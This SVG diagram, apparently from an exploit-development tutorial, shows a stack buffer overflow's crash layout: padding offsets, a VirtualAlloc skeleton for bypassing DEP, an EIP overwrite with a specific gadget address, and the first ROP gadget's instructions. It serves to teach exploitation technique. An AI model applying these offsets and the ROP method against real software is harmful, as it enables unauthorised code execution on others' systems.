<svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 1000 620" font-family="'Segoe UI',sans-serif">
  <defs>
    <linearGradient id="bg4" x1="0" y1="0" x2="1" y2="1"><stop offset="0" stop-color="#1a1a2e"/><stop offset="1" stop-color="#0f0f1e"/></linearGradient>
    <marker id="arr4" viewBox="0 0 10 10" refX="10" refY="5" markerWidth="8" markerHeight="8" orient="auto"><path d="M0,0 L10,5 L0,10 z" fill="#e94560"/></marker>
  </defs>
  <rect width="1000" height="620" fill="url(#bg4)"/>
  <text x="500" y="40" text-anchor="middle" fill="#e94560" font-size="22" font-weight="700">Stack layout at the moment of the crash</text>
  <text x="500" y="66" text-anchor="middle" fill="#c9c9d6" font-size="13">The 6-slot VirtualAlloc skeleton sits at ESP − 0x1C. EIP lands right after it.</text>

  <!-- Left: byte view -->
  <rect x="60" y="90" width="470" height="490" fill="#16213e" stroke="#3f3f6b"/>
  <text x="295" y="118" text-anchor="middle" fill="#a5c9ff" font-size="15" font-weight="700">Byte view (offsets into the crash buffer)</text>

  <g font-family="Consolas,monospace" font-size="12">
    <rect x="90" y="140" width="410" height="34" fill="#3b1d2a" stroke="#e94560"/>
    <text x="100" y="162" fill="#ffc7d0">offset 0..247   b"A"*248  (padding)</text>

    <rect x="90" y="180" width="410" height="34" fill="#ff9a4233" stroke="#ff9a42"/>
    <text x="100" y="202" fill="#ffc088">offset 248..251  [+0x00]  VirtualAlloc addr</text>

    <rect x="90" y="220" width="410" height="34" fill="#ff9a4233" stroke="#ff9a42"/>
    <text x="100" y="242" fill="#ffc088">offset 252..255  [+0x04]  RET → shellcode</text>

    <rect x="90" y="260" width="410" height="34" fill="#ff9a4233" stroke="#ff9a42"/>
    <text x="100" y="282" fill="#ffc088">offset 256..259  [+0x08]  lpAddress</text>

    <rect x="90" y="300" width="410" height="34" fill="#ff9a4233" stroke="#ff9a42"/>
    <text x="100" y="322" fill="#ffc088">offset 260..263  [+0x0C]  dwSize</text>

    <rect x="90" y="340" width="410" height="34" fill="#ff9a4233" stroke="#ff9a42"/>
    <text x="100" y="362" fill="#ffc088">offset 264..267  [+0x10]  flAllocationType</text>

    <rect x="90" y="380" width="410" height="34" fill="#ff9a4233" stroke="#ff9a42"/>
    <text x="100" y="402" fill="#ffc088">offset 268..271  [+0x14]  flProtect</text>

    <rect x="90" y="420" width="410" height="34" fill="#3b1d2a" stroke="#e94560"/>
    <text x="100" y="442" fill="#ffc7d0">offset 272..275  b"AAAA" (padding to 276)</text>

    <rect x="90" y="460" width="410" height="34" fill="#5aa9ff55" stroke="#5aa9ff"/>
    <text x="100" y="482" fill="#ffffff">offset 276..279  EIP ← 0x50501110</text>
    <text x="100" y="498" fill="#a5c9ff" font-size="10">                (push esp; push eax; pop edi; pop esi; ret)</text>

    <rect x="90" y="510" width="410" height="34" fill="#5aa9ff33" stroke="#5aa9ff"/>
    <text x="100" y="532" fill="#a5c9ff">offset 280..     ESP ← first ROP gadget</text>
    <text x="100" y="550" fill="#8fa2c7" font-size="10">                (chain begins here)</text>
  </g>

  <!-- Right: register view -->
  <rect x="560" y="90" width="380" height="490" fill="#16213e" stroke="#3f3f6b"/>
  <text x="750" y="118" text-anchor="middle" fill="#a5c9ff" font-size="15" font-weight="700">Register state at crash</text>

  <g font-family="Consolas,monospace" font-size="13">
    <text x="585" y="160" fill="#f7d774">EIP</text><text x="640" y="160" fill="#ffffff">= 0x50501110   (first gadget)</text>
    <text x="585" y="190" fill="#f7d774">ESP</text><text x="640" y="190" fill="#ffffff">= &amp;chain          </text>
    <text x="585" y="220" fill="#f7d774">EAX</text><text x="640" y="220" fill="#ffffff">= (garbage)    </text>
    <text x="585" y="250" fill="#f7d774">EBP,EDI,ESI</text><text x="720" y="250" fill="#ffffff">= 0x41414141   </text>
  </g>

  <text x="585" y="300" fill="#7fd28c" font-size="14" font-weight="700">First gadget's job:</text>
  <g font-family="Consolas,monospace" font-size="12" fill="#c9c9d6">
    <text x="585" y="325">push esp   ; save copy of ESP</text>
    <text x="585" y="345">push eax   ; junk on top</text>
    <text x="585" y="365">pop  edi   ; EDI = eax  (throwaway)</text>
    <text x="585" y="385">pop  esi   ; ESI = ESP  ← the prize</text>
    <text x="585" y="405">ret        ; step into next gadget</text>
  </g>

  <text x="585" y="450" fill="#f7d774" font-size="13" font-weight="700">Now ESI ≈ ESP_at_crash</text>
  <text x="585" y="475" fill="#c9c9d6" font-size="12">Skeleton starts at ESI − 0x1C.</text>
  <text x="585" y="495" fill="#c9c9d6" font-size="12">Every write into the skeleton</text>
  <text x="585" y="515" fill="#c9c9d6" font-size="12">is now a MOV [ESI], EAX away.</text>
</svg>
